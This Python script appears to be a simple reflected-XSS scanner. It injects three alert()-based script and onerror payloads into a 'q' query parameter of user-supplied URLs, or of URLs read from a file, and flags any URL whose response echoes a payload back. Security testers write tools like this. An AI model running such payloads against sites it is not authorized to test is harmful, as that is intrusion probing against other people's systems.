import requests

# Define the XSS payloads you want to test
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>"
]

def scan_xss(url):
    vulnerable = False
    for payload in payloads:
        # Inject the payload into a query parameter
        injection_url = f"{url}?q={payload}"

        try:
            response = requests.get(injection_url)
            if payload in response.text:
                print(f"Vulnerable to XSS: {injection_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    if not vulnerable:
        print("No XSS vulnerabilities found.")

def scan_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
        for url in urls:
            url = url.strip()  # Remove any leading/trailing whitespace
            if url:
                print(f"Scanning URL: {url}")
                scan_xss(url)

if __name__ == "__main__":
    choice = input("Enter '1' to scan a single URL or '2' to scan URLs from a file: ")
    if choice == '1':
        target_url = input("Enter the URL to scan: ")
        scan_xss(target_url)
    elif choice == '2':
        file_path = input("Enter the path to the .txt file containing URLs: ")
        scan_from_file(file_path)
    else:
        print("Invalid choice. Please enter '1' or '2'.")
